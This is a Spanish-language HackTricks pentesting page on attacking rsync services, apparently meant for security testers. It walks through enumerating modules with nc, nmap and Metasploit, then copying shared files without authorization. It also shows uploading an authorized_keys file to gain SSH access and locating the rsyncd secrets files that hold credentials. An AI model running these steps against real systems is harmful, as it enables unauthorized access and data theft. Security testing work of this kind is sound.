# 873 - Pentesting Rsync

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informaci칩n B치sica**

Desde [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** es una utilidad para [transferir](https://en.wikipedia.org/wiki/File\_transfer) y [sincronizar](https://en.wikipedia.org/wiki/File\_synchronization) [archivos](https://en.wikipedia.org/wiki/Computer\_file) de manera eficiente entre una computadora y un disco duro externo y entre [computadoras](https://en.wikipedia.org/wiki/Computer) en red al comparar los tiempos de modificaci칩n y tama침os de los archivos.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) Com칰nmente se encuentra en sistemas operativos [tipo Unix](https://en.wikipedia.org/wiki/Unix-like). El algoritmo de rsync es un tipo de [codificaci칩n delta](https://en.wikipedia.org/wiki/Delta\_encoding) y se utiliza para minimizar el uso de la red. [Zlib](https://en.wikipedia.org/wiki/Zlib) puede ser utilizado para [compresi칩n de datos](https://en.wikipedia.org/wiki/Data\_compression) adicional,[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) y [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) o [stunnel](https://en.wikipedia.org/wiki/Stunnel) pueden ser utilizados para seguridad.

**Puerto predeterminado:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Enumeraci칩n

### Banner y comunicaci칩n manual
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Enumerando Carpetas Compartidas**

Los **m칩dulos de Rsync** son reconocidos como **comparticiones de directorios** que podr칤an estar **protegidas con contrase침as**. Para identificar los m칩dulos disponibles y verificar si requieren contrase침as, se utilizan los siguientes comandos:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Ten en cuenta que es posible que algunas comparticiones no aparezcan en la lista, posiblemente est칠n ocultas. Adem치s, el acceso a algunas comparticiones podr칤a estar restringido a **credenciales** espec칤ficas, indicado por un mensaje de **"Acceso denegado"**.

### [**Fuerza bruta**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Uso manual de Rsync

Una vez obtenida una **lista de m칩dulos**, las acciones dependen de si se necesita autenticaci칩n. Sin autenticaci칩n, la **enumeraci칩n** y **copia** de archivos desde una carpeta compartida a un directorio local se logra mediante:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Este proceso **transfiere archivos de forma recursiva**, preservando sus atributos y permisos.

Con **credenciales**, la lista y descarga desde una carpeta compartida se puede hacer de la siguiente manera, donde aparecer치 un prompt para ingresar la contrase침a:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Para **subir contenido**, como un archivo _**authorized_keys**_ para acceso, usa:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Para localizar el archivo de configuraci칩n de rsyncd, ejecuta:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
Dentro de este archivo, un par치metro _secrets file_ podr칤a apuntar a un archivo que contiene **nombres de usuario y contrase침as** para la autenticaci칩n de rsyncd.


## Referencias
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
